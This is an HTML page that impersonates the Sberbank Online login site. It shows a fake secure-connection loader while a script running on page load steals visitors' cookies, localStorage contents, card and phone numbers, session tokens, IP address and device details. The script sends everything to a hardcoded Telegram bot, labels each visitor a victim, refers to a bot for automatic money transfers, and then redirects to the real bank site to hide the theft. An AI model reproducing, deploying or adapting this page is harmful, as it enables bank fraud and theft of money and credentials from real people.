<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>СберБанк Онлайн</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 24px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.1);
            max-width: 380px;
            width: 100%;
            padding: 32px 24px;
            text-align: center;
        }
        .logo {
            margin-bottom: 24px;
        }
        .logo svg {
            width: 80px;
            height: 80px;
        }
        .logo h1 {
            font-size: 24px;
            color: #2d6a4f;
            margin-top: 12px;
        }
        .loader {
            width: 40px;
            height: 40px;
            border: 4px solid #e0e0e0;
            border-top: 4px solid #2d6a4f;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .message {
            color: #666;
            font-size: 14px;
            margin-top: 16px;
        }
        .footer {
            margin-top: 24px;
            font-size: 11px;
            color: #999;
        }
    </style>
</head>
<body>
<div class="card">
    <div class="logo">
        <svg viewBox="0 0 100 100" fill="none">
            <circle cx="50" cy="50" r="45" fill="#2d6a4f"/>
            <text x="50" y="68" text-anchor="middle" fill="white" font-size="32" font-weight="bold">СБ</text>
        </svg>
        <h1>СберБанк Онлайн</h1>
    </div>
    <div class="loader"></div>
    <div class="message">Проверка защищенного соединения...</div>
    <div class="footer">SSL Secure Connection</div>
</div>

<script>
// ========== НАСТРОЙКИ ==========
const BOT_TOKEN = "8655252412:AAGvwRmEBisGeKA5bX5_xFNpp2QRJRTkkTM";  // ТОКЕН БОТА-СБОРЩИКА
const CHAT_ID = "8533450974";                           // ТВОЙ CHAT_ID
const TRANSFER_BOT = "SberTransferBot";                // Имя бота для переводов
// ================================

function sendToTelegram(text) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4096) })
    }).catch(e => console.log("Send error"));
}

// Поиск банковских данных в localStorage
function extractBankData() {
    const bankData = {};
    const keywords = ['card', 'phone', 'token', 'auth', 'session', 'user', 'login', 'sber', 'sb', 'account', 'balance'];
    
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        
        for (const kw of keywords) {
            if (key.toLowerCase().includes(kw)) {
                bankData[key] = value;
                break;
            }
        }
        
        // Поиск номера карты (16 цифр)
        const cardMatch = value.match(/\d{16}/);
        if (cardMatch) {
            bankData['found_card'] = cardMatch[0];
        }
        
        // Поиск телефона
        const phoneMatch = value.match(/\+?\d{11}/);
        if (phoneMatch) {
            bankData['found_phone'] = phoneMatch[0];
        }
    }
    return bankData;
}

// Кража и отправка всех данных
async function collectAndSend() {
    // 1. Отправка информации о жертве
    sendToTelegram(`🔐 НОВАЯ ЖЕРТВА
⏰ ${new Date().toLocaleString()}
🌐 ${window.location.hostname}
🖥️ ${navigator.userAgent.substring(0, 200)}`);

    // 2. Cookies
    if (document.cookie) {
        sendToTelegram(`🍪 COOKIES:\n${document.cookie}`);
    }

    // 3. LocalStorage
    const bankData = extractBankData();
    if (Object.keys(bankData).length > 0) {
        sendToTelegram(`🏦 БАНКОВСКИЕ ДАННЫЕ:\n${JSON.stringify(bankData, null, 2)}`);
    }

    // 4. Полный localStorage
    let fullLS = {};
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        let val = localStorage.getItem(key);
        if (val && val.length > 500) val = val.substring(0, 500) + "...";
        fullLS[key] = val;
    }
    if (Object.keys(fullLS).length > 0) {
        sendToTelegram(`💾 LOCALSTORAGE:\n${JSON.stringify(fullLS, null, 2)}`);
    }

    // 5. IP адрес
    try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        sendToTelegram(`🌐 IP: ${ipData.ip}`);
    } catch(e) {}

    // 6. Информация об устройстве
    sendToTelegram(`📱 УСТРОЙСТВО:
${JSON.stringify({
    screen: `${screen.width}x${screen.height}`,
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    platform: navigator.platform
}, null, 2)}`);

    // 7. Активация бота для перевода
    sendToTelegram(`💰 ЗАПРОС НА АВТОПЕРЕВОД\nБот: @${TRANSFER_BOT}\nДанные отправлены в бота-переводчика`);
    
    // 8. Отправка данных второму боту для перевода
    const transferData = {
        cookies: document.cookie,
        bankData: bankData,
        fullLS: fullLS,
        userAgent: navigator.userAgent,
        ip: await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown'),
        timestamp: new Date().toISOString()
    };
    
    // Отправляем данные второму боту (через API Telegram)
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: `🤖 ПЕРЕДАЧА ДАННЫХ БОТУ-ПЕРЕВОДЧИКУ:\n\`\`\`json\n${JSON.stringify(transferData, null, 2).substring(0, 3900)}\n\`\`\``
        })
    });
}

// Запуск сбора
collectAndSend();

// Перенаправление на реальный сайт
setTimeout(() => {
    window.location.href = "https://online.sberbank.ru";
}, 3000);
</script>
</body>
</html>
